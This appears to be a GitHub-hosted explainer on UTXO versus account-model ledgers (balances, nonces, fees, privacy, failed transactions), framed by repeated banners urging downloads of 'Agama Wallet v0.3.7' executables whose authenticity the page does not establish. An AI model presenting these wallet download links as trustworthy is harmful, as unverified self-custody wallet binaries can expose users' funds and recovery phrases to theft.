[![Agama Wallet](assets/banner-article.png)](https://github.com/agama-wallet/agama-desktop-wallet)

# UTXO vs Account Model: How the Two Ledger Designs Differ

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7"><img src="https://img.shields.io/badge/RELEASE-v0.3.7-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="Agama Wallet v0.3.7"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/blob/main/LICENSE"><img src="https://img.shields.io/badge/LICENSE-MIT-F47B20?style=for-the-badge&amp;labelColor=293D52" alt="MIT licence"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page.

---

The UTXO model tracks ownership as a set of discrete outputs, each spendable once; the account model tracks a balance per address and a counter that orders transactions. Bitcoin and Komodo use the first, Ethereum uses the second. Agama Wallet is a self-custody multi-asset wallet for the Komodo ecosystem, so every balance it shows is a sum of unspent outputs rather than a stored number.

## You'll see this if

You have used more than one chain and the same phrase produces different behaviour: one wallet shows a "nonce", another shows "inputs"; one lets you send from an address repeatedly, another hands you a fresh address each time.

| What you see | UTXO chain | Account chain |
|---|---|---|
| A transaction's "from" | A list of outputs being consumed | One sending address |
| Balance | Sum of unspent outputs | A stored number |
| Repeated sends from one address | Fine, each spend consumes different outputs | Fine, each spend increments a counter |
| Concurrent transactions | Independent, can be built in parallel | Ordered, the second waits for the first |
| A failed transaction's effect | Nothing moved; outputs remain unspent | Gas may be spent, state may revert |

Neither column is better. They are different bookkeeping choices with different consequences for fees, privacy and how a wallet must behave.

## Why it happens

An account ledger stores a number and mutates it: subtract from one row, add to another. A UTXO ledger stores nothing resembling a balance; it stores outputs, and a "balance" is computed by scanning the outputs that belong to the wallet and have not been spent.

That difference cascades into everything else:

- **Ordering.** An account chain needs a strict sequence per account, which is what a nonce provides. UTXO chains have no per-account sequence, so two payments from the same wallet do not collide as long as they consume different outputs.
- **Parallelism.** Because each transaction names the exact outputs it spends, UTXO transactions can be validated independently. Account transactions from one address cannot.
- **Fees.** A UTXO transaction's size grows with the number of inputs it consumes, so a wallet holding many small outputs pays more to move the same value. An account transaction's cost does not depend on how the balance was accumulated.
- **Privacy.** Account chains link every payment from an address by default. UTXO wallets can present a fresh address per payment, though consolidation can re-link them.
- **Failure.** A rejected UTXO transaction leaves the outputs untouched. A failed account transaction may still consume fees, because the work was done before the revert.

Cardano keeps outputs but attaches data and scripts to them, which is why it is described as extended rather than different; [Cardano's extended UTXO model](https://github.com/agama-wallet/utxo/blob/main/cardano-extended-model.md) covers that variant.

## Fix

There is nothing broken to repair, but the practical step is to read each wallet's numbers correctly, because the two models fail in different ways.

1. **On a UTXO chain, check spendable rather than total.** A balance that includes unconfirmed or locked outputs will not send.
2. **On an account chain, check the nonce.** A stuck transaction usually means a pending one is occupying the next slot.
3. **On a UTXO chain, expect change.** A new address in your own history is the remainder coming back, not an intruder.
4. **On an account chain, expect address reuse.** The same address appears on both sides of every payment by design.
5. **When moving between them, do not compare fees per transaction.** Compare the cost of the value you actually moved.

The mechanics of one spend are worked through in [what a UTXO is](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md), and the Bitcoin-specific form of the same rules is in [UTXOs in Bitcoin](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md).

## If that did not work

If a UTXO wallet still reports insufficient funds with a visible balance, the outputs are either too small or not yet confirmed. Selecting larger outputs manually, or waiting for confirmation, resolves both cases.

If an account-chain transaction sits pending while a replacement will not go through, the earlier transaction is holding the nonce and must be replaced or confirmed first.

If a balance differs between two wallets holding the same recovery material, the difference is usually derivation rather than the ledger model: the same phrase can produce different addresses in different software. [Why a seed phrase fails to restore](https://github.com/agama-wallet/agama-wallet/blob/main/why-a-seed-phrase-fails.md) explains the derivation gap. Never type a recovery phrase into a website, a support chat or a form, whatever it claims to fix.

## Prevention

- **Do not judge a UTXO wallet by its headline number.** Learn where spendable balance is shown and use that figure.
- **Do not consolidate outputs to "tidy up" without a reason.** Merging is permanent and visible on-chain.
- **Do not assume a fresh address means a new account.** On a UTXO chain it is usually change.
- **Keep one wallet per chain model where you can.** Mixing habits across models causes most of the confusion.
- **Check the chain's model before comparing costs.** A fee comparison between the two models is not like for like.

## FAQ

### Is the UTXO model older than the account model?

Bitcoin's UTXO design came first in practice, but the account model is the older idea from banking ledgers. Ethereum chose accounts for programmability, not because UTXO was unavailable.

### Why does Ethereum show a nonce and Bitcoin does not?

A nonce orders transactions from one account so they cannot be replayed or reordered. Bitcoin has no per-account sequence because each transaction names the exact outputs it consumes, which already prevents reuse.

### Can a chain switch between the two models?

Not without a fundamental redesign, since the model determines what a transaction is. Some chains add features to one model rather than switching: Cardano's extended outputs and Ethereum's account abstraction both extend their native design.

### Which model does Komodo use?

Komodo uses UTXO accounting, which is why KMD balances behave like Bitcoin balances, including change outputs and input-based fees. [Which blockchains use UTXO accounting](https://github.com/agama-wallet/utxo/blob/main/which-chains-use-outputs.md) lists the chains on each side.

---

## Download Agama Wallet v0.3.7

<div align="center">

<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Download Agama Wallet for Windows"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=apple&amp;logoColor=white" alt="Download Agama Wallet for Macos"></a>
<a href="https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F47B20?style=for-the-badge&amp;labelColor=293D52&amp;logo=linux&amp;logoColor=white" alt="Download Agama Wallet for Linux"></a>

</div>

<div align="center">

| Platform | File |
|---|---|
| <img src="https://img.shields.io/badge/WINDOWS-293D52?style=flat-square&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZicgZD0nTTAgMy40IDkuNyAydjkuNUgwek0xMSAxLjggMjQgMHYxMS42SDExek0wIDEyLjZoOS43VjIxTDAgMjAuNnpNMTEgMTIuNkgyNFYyNGwtMTMtMS44eicvPjwvc3ZnPg%3D%3D&amp;logoColor=white" alt="Windows" height="24"> | [`agamawallet-v.0.3.7.exe`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.exe) |
| <img src="https://img.shields.io/badge/MACOS-293D52?style=flat-square&amp;logo=apple&amp;logoColor=white" alt="Macos" height="24"> | [`agamawallet-v.0.3.7.dmg`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.dmg) |
| <img src="https://img.shields.io/badge/LINUX-293D52?style=flat-square&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | [`agamawallet-v.0.3.7.zip`](https://github.com/agama-wallet/agama-desktop-wallet/releases/download/v-0.3.7/agamawallet-v.0.3.7.zip) |

</div>
All versions and checksums are on the [Agama Wallet release page](https://github.com/agama-wallet/agama-desktop-wallet/releases/tag/v-0.3.7).

> Only download from this GitHub release page, and compare each file with the value printed there.

## Related guides

- [What Is a UTXO? Unspent Transaction Outputs Explained](https://github.com/agama-wallet/utxo/blob/main/unspent-transaction-outputs-explained.md)
- [Cardano's Extended UTXO Model](https://github.com/agama-wallet/utxo/blob/main/cardano-extended-model.md)
- [UTXOs in Bitcoin: How Coins Are Actually Held](https://github.com/agama-wallet/utxo/blob/main/how-bitcoin-holds-coins.md)
- [Coin Control: Choosing Which UTXOs a Transaction Spends](https://github.com/agama-wallet/utxo/blob/main/choosing-which-coins-to-spend.md)
